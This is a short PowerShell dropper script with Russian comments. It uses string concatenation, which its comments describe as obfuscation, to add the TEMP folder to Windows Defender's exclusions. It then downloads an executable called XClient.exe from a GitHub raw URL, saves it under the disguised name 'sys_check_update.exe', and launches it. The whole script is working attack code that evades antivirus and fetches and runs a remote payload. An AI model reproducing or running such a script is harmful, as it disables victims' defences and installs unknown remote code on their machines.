# Обфусцированный вызов исключения
$p = "Ex"+"clusion"+"Path"
$cmd = "Add-Mp"+"Preference"
$t = $env:TEMP

# Выполняем добавление в исключения через склейку
& $cmd -$p $t

# Качаем билд (ссылку тоже можно подклеить)
$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
$o = "$t\sys_check_update.exe"

$wc = New-Object Net.WebClient
$wc.DownloadFile($u, $o)

# Запуск
Start-Process $o
